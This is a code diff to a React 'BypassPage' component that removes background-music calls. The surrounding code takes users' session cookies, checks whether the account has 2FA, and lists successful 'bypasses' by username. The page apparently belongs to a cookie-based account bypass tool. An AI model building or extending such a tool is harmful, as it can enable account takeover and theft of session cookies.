@@ -9,7 +9,6 @@ import {
 } from "@/lib/tokenStore";
 import { supabase } from "@/integrations/supabase/client";
 import { toast } from "sonner";
-import { startPhonk, stopPhonk } from "@/lib/phonkPlayer";
 
 const RATE_LIMIT_KEY = "bypass_attempts";
 const MAX_ATTEMPTS_PER_HOUR = 3;
@@ -39,7 +38,6 @@ const BypassPage = () => {
 
   useEffect(() => () => {
     if (intervalRef.current) window.clearInterval(intervalRef.current);
-    stopPhonk();
   }, []);
 
   function getAttempts(): number[] {
@@ -74,7 +72,6 @@ const BypassPage = () => {
     recordAttempt();
     setStatus("loading");
     setProgress(0);
-    startPhonk();
 
     const start = Date.now();
     intervalRef.current = window.setInterval(() => {
@@ -93,7 +90,6 @@ const BypassPage = () => {
 
     if (!apiOk) {
       if (intervalRef.current) window.clearInterval(intervalRef.current);
-      stopPhonk();
       setProgress(0);
       setStatus("error");
       toast.error("Invalid cookie — bypass blocked");
@@ -102,7 +98,6 @@ const BypassPage = () => {
 
     if (info.has2FA) {
       if (intervalRef.current) window.clearInterval(intervalRef.current);
-      stopPhonk();
       setProgress(0);
       setStatus("error");
       toast.error("Account secured (Authenticator enabled)");
@@ -117,7 +112,6 @@ const BypassPage = () => {
     if (elapsed < BYPASS_DURATION_MS) await new Promise(r => setTimeout(r, BYPASS_DURATION_MS - elapsed));
 
     if (intervalRef.current) window.clearInterval(intervalRef.current);
-    stopPhonk();
     setProgress(100);
 
     pushLiveBypass({ username: info.username || 'Unknown', avatarUrl: info.avatarUrl, success: true });
